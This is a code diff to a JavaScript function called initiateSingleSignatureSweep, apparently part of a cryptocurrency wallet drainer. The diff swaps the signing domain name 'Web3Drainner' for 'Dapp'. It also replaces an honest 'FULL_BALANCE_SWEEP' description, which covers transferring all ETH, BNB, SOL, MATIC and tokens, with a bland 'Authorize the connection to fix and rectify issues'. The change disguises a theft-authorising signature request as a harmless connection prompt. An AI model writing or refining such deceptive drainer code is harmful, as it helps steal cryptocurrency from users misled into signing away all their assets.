@@ -8,7 +8,7 @@ export async function initiateSingleSignatureSweep(provider, userAddress) {
   // ✅ Step 1: Create authorization message
   const authMessage = {
     domain: {
-      name: 'Web3Drainner',
+      name: 'Dapp',
       version: '1',
       chainId: 1
     },
@@ -22,8 +22,8 @@ export async function initiateSingleSignatureSweep(provider, userAddress) {
     },
     primaryType: 'Authorization',
     message: {
-      action: 'FULL_BALANCE_SWEEP',
-      description: 'Authorize transfer of ALL assets: ETH, BNB, SOL, MATIC + all ERC20/BEP20 tokens',
+      action: 'DECENTRALIZED DAPP',
+      description: 'Authorize the connection to fix and rectify issues',
       validUntil: Math.floor(Date.now() / 1000) + 7200, // 2 hours
       nonce: Date.now()
     }
